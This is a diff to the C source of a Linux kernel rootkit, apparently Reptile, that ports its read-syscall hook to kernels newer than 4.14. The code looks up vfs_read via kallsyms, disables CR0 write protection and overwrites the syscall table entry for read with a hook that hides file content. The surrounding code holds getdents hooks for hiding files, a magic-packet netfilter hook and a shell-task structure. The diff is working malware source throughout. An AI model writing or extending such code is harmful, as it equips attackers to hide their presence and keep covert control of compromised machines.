@@ -52,21 +52,26 @@
 #define SSIZE_MAX 	32767
 
 int hidden = 0, hide_file_content = 1;
+struct workqueue_struct *work_queue;
+static struct nf_hook_ops magic_packet_hook_options;
 static struct list_head *mod_list;
 static unsigned long *sct;
 atomic_t read_on;
-struct workqueue_struct *work_queue;
-static struct nf_hook_ops magic_packet_hook_options;
+
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
+	#define SYM_NAME "vfs_read"
+    	asmlinkage size_t (*vfs_read_addr)(struct file *file, char __user *buf, size_t count, loff_t *pos);
+#endif
 
 asmlinkage int (*o_kill)(pid_t pid, int sig);
 asmlinkage int (*o_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
 asmlinkage int (*o_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
-asmlinkage ssize_t (*o_read)(int fd, void *buf, size_t nbytes);
+asmlinkage ssize_t (*o_read)(unsigned int fd, char __user *buf, size_t count);
 
 asmlinkage int l33t_kill(pid_t pid, int sig);
 asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
 asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
-asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes);
+asmlinkage ssize_t l33t_read(unsigned int fd, char __user *buf, size_t count);
 
 struct shell_task {
     	struct work_struct work;
@@ -539,7 +544,7 @@ end:
 	return ret;
 }
 
-asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes) {
+asmlinkage ssize_t l33t_read(unsigned int fd, char __user *buf, size_t count) {
 	struct file *f;
 	int fput_needed;
 	ssize_t ret;
@@ -551,20 +556,18 @@ asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes) {
 		f = e_fget_light(fd, &fput_needed);
 
 		if (f) {
-//#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
-			ret = vfs_read(f, buf, nbytes, &f->f_pos);
-//#else
-//			This is crashing Fedora 26 with kernel 4.16.7-100.fc26.x86_64
-
-//			ret = kernel_read(f, buf, nbytes, &f->f_pos);
-//#endif
+#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
+			ret = vfs_read(f, buf, count, &f->f_pos);
+#else
+			ret = vfs_read_addr(f, buf, count, &f->f_pos);
+#endif			
 			if(f_check(buf, ret) == 1) ret = hide_content(buf, ret);
 	    	
 			fput_light(f, fput_needed);
 		}
 		atomic_set(&read_on, 0);
 	} else {
-		ret = o_read(fd, buf, nbytes);
+		ret = o_read(fd, buf, count);
 	}
 
 	return ret;
@@ -606,6 +609,11 @@ static int __init reptile_init(void) {
     	work_queue = create_workqueue(HIDE);	
 	
 	exec(argv);
+
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
+    	vfs_read_addr = (void *)kallsyms_lookup_name(SYM_NAME);
+#endif
+
 	write_cr0(read_cr0() & (~0x10000));
 	sct[__NR_read] = (unsigned long)l33t_read;		
 	write_cr0(read_cr0() | 0x10000);
